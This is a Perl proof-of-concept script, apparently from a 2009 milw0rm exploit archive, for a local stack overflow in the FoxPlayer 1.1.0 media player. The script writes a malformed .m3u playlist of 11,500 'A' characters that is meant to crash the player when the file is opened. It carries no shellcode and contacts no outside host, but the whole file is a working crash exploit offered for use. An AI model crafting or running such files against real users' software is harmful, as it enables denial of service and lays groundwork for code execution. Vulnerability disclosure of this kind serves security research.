#!/usr/bin/perl
# FoxPlayer 1.1.0 (m3u) local stack overlow POC
#finded by opt!x hacker  <optix@9.cn>
#download : http://files.brothersoft.com/regnow/fox-player-setup.exe
my $header="#M3u";
my $crash="A" x 11500;
my $poc=$crash;
open(myfile,'>>AIDI.m3u');
print myfile $poc;

# milw0rm.com [2009-08-07]